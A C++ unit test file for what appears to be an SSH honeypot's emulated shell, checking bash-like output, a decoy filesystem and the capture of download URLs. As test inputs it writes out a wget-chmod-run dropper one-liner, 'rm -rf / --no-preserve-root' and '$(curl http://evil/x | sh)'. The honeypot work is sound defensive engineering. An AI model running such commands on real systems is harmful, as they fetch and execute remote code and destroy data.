#include <arapuca/ssh/shell.hpp>

#include <gtest/gtest.h>

#include <string>

namespace {

using arapuca::ssh::CommandRegistry;
using arapuca::ssh::Shell;
using arapuca::ssh::ShellContext;
using arapuca::ssh::Vfs;

const CommandRegistry& registry() {
    static const CommandRegistry kInstance = CommandRegistry::standard();
    return kInstance;
}

ShellContext context(const std::string& user = "root") {
    ShellContext ctx;
    ctx.username = user;
    ctx.cwd = user == "root" ? "/root" : "/home/" + user;
    ctx.vfs = Vfs::from_file(std::string(ARAPUCA_CONFIG_DIR) + "/filesystem.yaml");
    return ctx;
}

Shell shell(const std::string& user = "root") {
    return {registry(), context(user)};
}

std::string run(Shell& sh, const std::string& line) {
    return sh.execute(line).output;
}

// --- prompt ---------------------------------------------------------------

TEST(Shell, RootPromptUsesHash) {
    EXPECT_EQ("root@srv-web-03:~# ", shell().prompt());
}

TEST(Shell, NonRootPromptUsesDollar) {
    EXPECT_EQ("deploy@srv-web-03:~$ ", shell("deploy").prompt());
}

TEST(Shell, PromptAbbreviatesHome) {
    auto sh = shell("deploy");
    run(sh, "cd /etc");
    EXPECT_EQ("deploy@srv-web-03:/etc$ ", sh.prompt());
}

// --- navigation -----------------------------------------------------------

TEST(Shell, PwdAndCd) {
    auto sh = shell();
    EXPECT_EQ("/root\n", run(sh, "pwd"));
    run(sh, "cd /etc/ssh");
    EXPECT_EQ("/etc/ssh\n", run(sh, "pwd"));
    run(sh, "cd ..");
    EXPECT_EQ("/etc\n", run(sh, "pwd"));
}

TEST(Shell, CdToAMissingDirectoryFails) {
    auto sh = shell();
    const auto result = sh.execute("cd /nonexistent");
    EXPECT_NE(std::string::npos, result.output.find("No such file or directory"));
    EXPECT_NE(0, result.status);
}

TEST(Shell, CdToAFileFails) {
    auto sh = shell();
    EXPECT_NE(std::string::npos, run(sh, "cd /etc/passwd").find("Not a directory"));
}

// A traversal cannot leave the virtual tree, no matter how many levels up it
// asks for.
TEST(Shell, CannotEscapeTheRoot) {
    auto sh = shell();
    run(sh, "cd ../../../../../../../..");
    EXPECT_EQ("/\n", run(sh, "pwd"));
}

TEST(Shell, BareCdGoesHome) {
    auto sh = shell("deploy");
    run(sh, "cd /etc");
    run(sh, "cd");
    EXPECT_EQ("/home/deploy\n", run(sh, "pwd"));
}

// --- reading --------------------------------------------------------------

TEST(Shell, CatReadsTheFakeFilesystem) {
    auto sh = shell();
    const std::string out = run(sh, "cat /etc/passwd");
    EXPECT_NE(std::string::npos, out.find("root:x:0:0"));
    EXPECT_NE(std::string::npos, out.find("deploy"));
}

TEST(Shell, CatOnTheDecoyCredentials) {
    auto sh = shell();
    EXPECT_NE(std::string::npos, run(sh, "cat /opt/app/.env").find("DB_PASSWORD"));
}

TEST(Shell, CatOnAMissingFile) {
    auto sh = shell();
    const auto result = sh.execute("cat /etc/nothing");
    EXPECT_NE(std::string::npos, result.output.find("No such file or directory"));
    EXPECT_EQ(1, result.status);
}

TEST(Shell, LsPlainAndLong) {
    auto sh = shell();
    EXPECT_NE(std::string::npos, run(sh, "ls /etc").find("passwd"));

    const std::string long_form = run(sh, "ls -l /etc");
    EXPECT_NE(std::string::npos, long_form.find("total "));
    EXPECT_NE(std::string::npos, long_form.find("root"));
    EXPECT_NE(std::string::npos, long_form.find("passwd"));
}

TEST(Shell, LsHidesDotFilesWithoutMinusA) {
    auto sh = shell("deploy");
    EXPECT_EQ(std::string::npos, run(sh, "ls /home/deploy").find(".bashrc"));
    EXPECT_NE(std::string::npos, run(sh, "ls -a /home/deploy").find(".bashrc"));
}

TEST(Shell, GrepFindsInAFakeFile) {
    auto sh = shell();
    EXPECT_NE(std::string::npos, run(sh, "grep root /etc/passwd").find("root:x:0:0"));
}

// --- identity -------------------------------------------------------------

TEST(Shell, WhoamiAndId) {
    auto root = shell();
    EXPECT_EQ("root\n", run(root, "whoami"));
    EXPECT_NE(std::string::npos, run(root, "id").find("uid=0(root)"));

    auto deploy = shell("deploy");
    EXPECT_EQ("deploy\n", run(deploy, "whoami"));
    EXPECT_NE(std::string::npos, run(deploy, "id").find("uid=1000(deploy)"));
}

TEST(Shell, UnameVariants) {
    auto sh = shell();
    EXPECT_EQ("Linux\n", run(sh, "uname"));
    EXPECT_NE(std::string::npos, run(sh, "uname -a").find("GNU/Linux"));
    EXPECT_NE(std::string::npos, run(sh, "uname -a").find("srv-web-03"));
    EXPECT_EQ("x86_64\n", run(sh, "uname -m"));
}

// --- unknown commands -----------------------------------------------------

// The error has to be the one bash gives. Anything else reads as a trap.
TEST(Shell, UnknownCommandLooksLikeBash) {
    auto sh = shell();
    const auto result = sh.execute("definitelynotacommand --flag");
    EXPECT_EQ("bash: definitelynotacommand: command not found\n", result.output);
    EXPECT_EQ(127, result.status);
    ASSERT_EQ(1U, result.unknown_commands.size());
    EXPECT_EQ("definitelynotacommand", result.unknown_commands.front());
}

TEST(Shell, UnknownCommandsAreReportedForAlerting) {
    auto sh = shell();
    const auto result = sh.execute("foo; bar; ls");
    EXPECT_EQ(2U, result.unknown_commands.size());
}

// --- separators -----------------------------------------------------------

TEST(Shell, AndStopsOnFailure) {
    auto sh = shell();
    const auto result = sh.execute("cd /nonexistent && whoami");
    EXPECT_EQ(std::string::npos, result.output.find("root\n"));
}

TEST(Shell, AndContinuesOnSuccess) {
    auto sh = shell();
    EXPECT_NE(std::string::npos, sh.execute("cd /etc && pwd").output.find("/etc"));
}

TEST(Shell, OrRunsOnlyAfterFailure) {
    auto sh = shell();
    EXPECT_NE(std::string::npos, sh.execute("cd /nonexistent || whoami").output.find("root"));

    // Compared exactly rather than searched: pwd prints "/root", which
    // contains the text whoami would have printed.
    EXPECT_EQ("/root\n", sh.execute("pwd || whoami").output);
}

TEST(Shell, SemicolonAlwaysContinues) {
    auto sh = shell();
    EXPECT_NE(std::string::npos, sh.execute("cd /nonexistent; whoami").output.find("root"));
}

// --- the dropper path -----------------------------------------------------

// The shape the capture engine keys on, and the single most valuable thing a
// honeypot sees.
TEST(Shell, DropperOneLinerIsHandledAndTheUrlExtracted) {
    auto sh = shell();
    const auto result =
        sh.execute("cd /tmp; wget http://198.51.100.9/bot.sh; chmod +x bot.sh; ./bot.sh");

    ASSERT_EQ(1U, result.urls.size());
    EXPECT_EQ("http://198.51.100.9/bot.sh", result.urls.front());
    EXPECT_NE(std::string::npos, result.output.find("saved"));
    // The downloaded file exists afterwards, so a later `ls` is consistent.
    EXPECT_TRUE(sh.context().vfs.exists("/tmp/bot.sh"));
}

TEST(Shell, CurlUrlIsExtracted) {
    auto sh = shell();
    const auto result = sh.execute("curl -sO https://example.com/payload.bin");
    ASSERT_EQ(1U, result.urls.size());
    EXPECT_EQ("https://example.com/payload.bin", result.urls.front());
}

TEST(Shell, SeveralUrlsOnOneLine) {
    auto sh = shell();
    const auto result = sh.execute("wget http://a.example/1.sh; curl -O http://b.example/2.sh");
    EXPECT_EQ(2U, result.urls.size());
}

TEST(Shell, WgetWithoutUrlFails) {
    auto sh = shell();
    const auto result = sh.execute("wget");
    EXPECT_TRUE(result.urls.empty());
    EXPECT_NE(0, result.status);
}

// --- session local writes -------------------------------------------------

TEST(Shell, CreatedFilesPersistWithinTheSession) {
    auto sh = shell();
    run(sh, "cd /tmp");
    run(sh, "touch marker");
    EXPECT_NE(std::string::npos, run(sh, "ls /tmp").find("marker"));
}

TEST(Shell, RemovalWorksAndIsSessionLocal) {
    auto sh = shell();
    run(sh, "rm /etc/passwd");
    EXPECT_NE(std::string::npos, run(sh, "cat /etc/passwd").find("No such file"));

    // A second session sees the original machine again.
    auto fresh = shell();
    EXPECT_NE(std::string::npos, run(fresh, "cat /etc/passwd").find("root:x:0:0"));
}

// --- privilege ------------------------------------------------------------

TEST(Shell, SudoRefusesForANonRootUser) {
    auto sh = shell("deploy");
    EXPECT_NE(std::string::npos, run(sh, "sudo su").find("not in the sudoers file"));
}

TEST(Shell, AptNeedsRoot) {
    auto sh = shell("deploy");
    EXPECT_NE(std::string::npos, run(sh, "apt update").find("Permission denied"));
    auto root = shell();
    EXPECT_NE(std::string::npos, run(root, "apt update").find("Reading package lists"));
}

// --- history and exit -----------------------------------------------------

TEST(Shell, HistoryRecordsWhatWasTyped) {
    auto sh = shell();
    run(sh, "whoami");
    run(sh, "uname -a");
    const std::string out = run(sh, "history");
    EXPECT_NE(std::string::npos, out.find("whoami"));
    EXPECT_NE(std::string::npos, out.find("uname -a"));
}

TEST(Shell, HistoryCanBeCleared) {
    auto sh = shell();
    run(sh, "whoami");
    run(sh, "uname -a");
    run(sh, "history -c");

    // Real bash records a command before running it, so the `history` call
    // below is itself in the list by the time it prints. What must be gone is
    // everything from before the clear, which is what an attacker covering
    // their tracks is after, and what T1070.003 flags.
    const std::string out = run(sh, "history");
    EXPECT_EQ(std::string::npos, out.find("whoami"));
    EXPECT_EQ(std::string::npos, out.find("uname -a"));
    EXPECT_NE(std::string::npos, out.find("history"));
}

TEST(Shell, ExitRequestsTermination) {
    auto sh = shell();
    const auto result = sh.execute("exit");
    EXPECT_TRUE(result.exit_requested);
}

TEST(Shell, CommandsAfterExitAreNotRun) {
    auto sh = shell();
    const auto result = sh.execute("exit; whoami");
    EXPECT_TRUE(result.exit_requested);
    EXPECT_EQ(std::string::npos, result.output.find("root\n"));
}

// --- safety ---------------------------------------------------------------

// Nothing is expanded and nothing is executed. A substitution is an argument,
// and an argument is text to record.
TEST(Shell, NoExpansionHappens) {
    auto sh = shell();
    const std::string out = run(sh, "echo $(whoami) $HOME `id`");
    EXPECT_NE(std::string::npos, out.find("$(whoami)"));
    EXPECT_NE(std::string::npos, out.find("$HOME"));
    EXPECT_EQ(std::string::npos, out.find("uid=0"));
}

TEST(Shell, OutputIsCapped) {
    auto sh = shell();
    std::string line = "echo";
    for (int i = 0; i < 400; ++i) {
        line += " " + std::string(1000, 'a');
    }
    EXPECT_LE(sh.execute(line).output.size(), Shell::kMaxOutputBytes);
}

TEST(Shell, HostileInputIsSurvivable) {
    auto sh = shell();
    for (const auto* line : {"",
                             "   ",
                             ";;;;",
                             "&&&&",
                             "|||",
                             R"("""")",
                             "''''",
                             "cat /etc/passwd; rm -rf / --no-preserve-root",
                             "$(curl http://evil/x | sh)",
                             "\xFF\xFE binary"}) {
        EXPECT_NO_THROW({ (void)sh.execute(line); }) << line;
    }
}

TEST(Shell, EmptyLineProducesNothing) {
    auto sh = shell();
    const auto result = sh.execute("");
    EXPECT_TRUE(result.output.empty());
    EXPECT_TRUE(result.segments.empty());
}

// --- registry -------------------------------------------------------------

TEST(CommandRegistryTest, CoversTheCommandsAttackersActuallyType) {
    const auto& reg = registry();
    for (const auto* name :
         {"ls",  "cd",        "pwd",  "whoami", "id",   "uname",   "cat",     "echo",
          "ps",  "wget",      "curl", "chmod",  "rm",   "crontab", "netstat", "ifconfig",
          "apt", "systemctl", "su",   "sudo",   "exit", "history", "which",   "free",
          "df",  "uptime",    "grep", "head",   "tail"}) {
        EXPECT_NE(nullptr, reg.find(name)) << name << " is not registered";
    }
    EXPECT_GT(reg.size(), 40U);
}

TEST(CommandRegistryTest, UnknownNameHasNoHandler) {
    EXPECT_EQ(nullptr, registry().find("definitelynotacommand"));
}

}  // namespace
